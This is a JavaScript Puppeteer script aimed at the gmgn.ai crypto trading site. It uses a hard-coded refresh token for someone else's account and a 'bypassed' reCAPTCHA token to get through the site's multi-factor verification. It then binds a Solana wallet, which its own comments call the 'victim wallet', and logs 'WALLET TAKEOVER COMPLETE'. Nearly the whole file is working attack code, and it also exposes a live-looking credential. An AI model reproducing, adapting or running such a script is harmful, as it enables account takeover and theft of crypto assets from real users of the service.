const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const fs = require('fs');

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzUyNDIxLCJpYXQiOjE3ODQxNjA0MjEsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOGI5MGIxMzktODAzYi00NDNiLWE4OWYtYTIyYTgwYmE2OGI2IiwibmJmIjoxNzg0MTYwNDIxLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.5G4VW1NtqC9JPF-gaEnIE3bjOp1KIA01ROcTEoIy7QxQzwKIJJy37Zit7ON5TrXyyCZFNSt2cHbbj6z1_jijMA';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

// Read the bypassed captcha token
const CAPTCHA_TOKEN = fs.readFileSync('/tmp/captcha_token.txt', 'utf8').trim();

(async () => {
    console.log('🔥 USING BYPASSED RECAPTCHA TOKEN FOR BIND_WALLET');
    console.log('Token length:', CAPTCHA_TOKEN.length);
    console.log('Token start:', CAPTCHA_TOKEN.substring(0, 40));
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 3000));
    
    const result = await page.evaluate(async (refresh, params, target, captchaToken) => {
        const log = [];
        try {
            // Token
            let r = await fetch('/account/account/refresh_access_token', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({refresh_token: refresh})
            });
            let text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch(e) { return {error: 'non-json', text: text.substring(0,200)}; }
            if (data.code !== 0) return {error: 'token: ' + data.message};
            const token = data.data.data.token;
            const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
            log.push('✅ Token OK');
            
            // Generate txn_id
            r = await fetch('/account/account/generate_mfa_params?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'mfa: ' + data.message, log};
            const txnId = data.data.data.txn_id;
            log.push('✅ txn_id: ' + txnId);
            
            // fetch_captcha → request_id
            r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'fetch_captcha: ' + data.message, log};
            const requestId = data.data.request_id;
            log.push('✅ request_id: ' + requestId);
            
            // VERIFY CAPTCHA WITH BYPASSED TOKEN!
            r = await fetch('/account/mfa/txn/v1/verify_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({
                    txn_id: txnId,
                    request_id: requestId,
                    usage: 'bind_wallet',
                    captcha_type: 'recaptcha_score',
                    captcha_data: captchaToken
                })
            });
            data = await r.json();
            log.push('🔥 VERIFY CAPTCHA: code=' + data.code + ' msg=' + (data.message || ''));
            
            if (data.code === 0) {
                log.push('💀💀💀💀💀 CAPTCHA PASSED!!!');
                
                // BIND VICTIM WALLET!
                r = await fetch('/account/bind_wallet?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
                });
                data = await r.json();
                log.push('💀 BIND WALLET: ' + JSON.stringify(data));
                
                if (data.code === 0) {
                    log.push('💀💀💀💀💀💀💀💀💀💀 WALLET TAKEOVER COMPLETE!!!');
                    return {log, SUCCESS: true, WALLET_BOUND: true, bindResult: data};
                }
                
                return {log, captchaPassed: true, bindResult: data, txnId};
            }
            
            return {log, verifyResult: data, txnId, requestId};
        } catch(e) { return {error: e.message, log}; }
    }, FRESH_REFRESH, PARAMS, TARGET, CAPTCHA_TOKEN);
    
    console.log('\n' + '='.repeat(80));
    console.log('RESULT:');
    console.log('='.repeat(80));
    console.log(JSON.stringify(result, null, 2));
    
    await browser.close();
})();
